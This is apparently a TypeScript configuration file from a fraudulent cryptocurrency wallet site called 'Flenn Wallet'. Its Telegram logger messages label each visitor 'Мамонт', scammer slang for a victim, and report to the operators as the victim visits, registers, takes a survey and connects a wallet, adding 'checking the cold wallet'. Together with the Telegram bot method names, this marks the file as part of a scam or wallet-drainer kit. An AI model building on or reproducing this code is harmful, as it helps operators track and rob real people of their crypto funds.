// * Initial data for set project name, limits, etc.
// * def - default project name

export const projectNames = {
    def: "Flenn",
    defCaps: "FLENN",
    defWallet: "Flenn Wallet",
    defCapsWallet: "FLENN Wallet",
    defWalletLtd: "Flenn Wallet LTD",
};
export const curPromoCount: number = 60;

// * Data for TG logger
export const logMessages = {
    visited: `Мамонт <b>перешел на сайт</b>`,
    startRegister: `Мамонт <b>регистрируется</b>`,
    registered: `Мамонт <b>зарегистрировался</b>`,
    survey: `Мамонт <b>прошёл опрос</b>`,
    walletConnect: `<b><u>Кошелёк добавлен.</u></b> Проверяю холодок...`,
};

export const TG_METHOD_NAMES = {
    updates: "getUpdates",
    sendMessage: "sendMessage",
};
